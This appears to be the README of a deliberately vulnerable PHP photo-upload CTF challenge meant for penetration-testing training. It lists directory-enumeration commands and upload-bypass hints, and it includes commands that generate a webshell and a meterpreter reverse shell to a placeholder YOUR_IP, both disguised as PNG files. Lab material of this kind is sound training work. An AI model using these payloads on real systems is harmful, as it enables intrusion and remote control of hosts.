# Cyberwars Photo Upload CTF Challenge

This is a photo upload web application designed for cybersecurity training and penetration testing practice.

## Setup

1. **Web Server**: Deploy using Docker or Apache/Nginx with PHP support
2. **Dependencies**: PHP 7.4+ with file upload support
3. **Permissions**: Ensure web server can write to upload directories

## Challenge Overview

- Users can upload photos with titles and descriptions
- Photos are displayed in a gallery
- Various security measures are in place (or are they?)

## For Penetration Testers

### Reconnaissance Phase
- [ ] Directory enumeration with tools like gobuster, dirb, or dirbuster
- [ ] Check robots.txt and common files
- [ ] Analyze upload functionality and restrictions
- [ ] Look for hidden endpoints and administrative interfaces

### Recommended Wordlists
```bash
# Common directories
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt

# Admin panels
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/admin.txt

# Backup files
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/backup.txt
```

### File Upload Testing
- Test various file types and extensions
- Check for file type validation bypasses
- Look for ways to execute uploaded files
- Consider polyglot files (files that are valid in multiple formats)

### Payload Generation
Use the included `generate_payload.py` script to create test payloads:

```bash
# Generate a simple webshell
python3 generate_payload.py webshell test.png

# Generate a meterpreter reverse shell
python3 generate_payload.py reverse YOUR_IP 4444 shell.png
```

## Learning Objectives

- File upload vulnerability assessment
- Directory enumeration techniques
- Payload crafting and execution
- Web shell deployment and usage
- Reverse shell establishment

## Security Note

This application contains intentional vulnerabilities for educational purposes. 
**Do not deploy in production environments.**

## Hints

- Not all endpoints are linked from the main pages
- File validation might not be as strict as it appears
- Administrative functions might be accessible
- Check what happens when you visit uploaded files directly

Good luck with your penetration testing practice!
